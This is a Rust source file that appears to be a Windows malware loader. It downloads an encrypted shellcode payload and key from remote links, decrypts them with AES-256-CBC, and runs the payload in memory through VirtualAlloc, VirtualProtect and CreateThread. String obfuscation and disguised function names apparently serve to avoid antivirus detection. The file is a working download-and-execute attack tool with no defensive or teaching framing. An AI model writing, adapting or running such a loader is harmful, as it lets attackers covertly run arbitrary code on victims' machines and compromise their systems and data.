extern crate aes;
extern crate block_modes;
extern crate pbkdf2;
extern crate sha2;
extern crate hex;
extern crate hmac;

use aes::Aes256;
use block_modes::{Cbc, BlockMode};
use block_modes::block_padding::Pkcs7;
use std::env;
use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

use obfstr::obfstr;

macro_rules! a1 {
    ($name:ident ($($arg:ident : $type:ty),*) -> $ret:ty $body:block) => {
        fn $name($($arg: $type),*) -> $ret $body
    };
}

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const IV_SIZE: usize = 16;

a1!(main() -> std::io::Result<()> {
    let enc_shellcode = obfstr!("shellcodelink").to_string();
    let keycode = obfstr!("key.txt link").to_string();

    match obf_exec(&enc_shellcode, &keycode) {
        Ok(_) => Ok(()),
    Err(e) => Err(std::io::Error::new(std::io::ErrorKind::Other, e))
    }
});

a1!(fetch_data(url: &str) -> Result<Vec<u8>, reqwest::Error> {
    let response = reqwest::blocking::get(url)?;
    let content = response.bytes()?;
    Ok(content.to_vec())
});

a1!(obf_exec(input_filename: &str, key_filename: &str) -> Result<(), String> {
    let key = fetch_data(key_filename).unwrap();
    let encrypted_data = fetch_data(input_filename).unwrap();
    let iv = vec![0u8; IV_SIZE];
    let cipher = Aes256Cbc::new_from_slices(&key, &iv).unwrap();
    let decrypted_data = cipher.decrypt_vec(&encrypted_data).unwrap();
    let shellcode_size = decrypted_data.len();

    unsafe {
        let addr = VirtualAlloc(null(), shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if addr.is_null() {
            panic!("{}: {}", obfstr!("[-]VAlloc failed"), GetLastError());
        }

        copy(decrypted_data.as_ptr(), addr.cast(), shellcode_size);
        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("{}: {}", obfstr!("[-]VProtect failed"), GetLastError());
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            panic!("{}: {}", obfstr!("[-]CThread failed"), GetLastError());
        }
        WaitForSingleObject(thread, WAIT_FAILED);
    }
    Ok(())
});
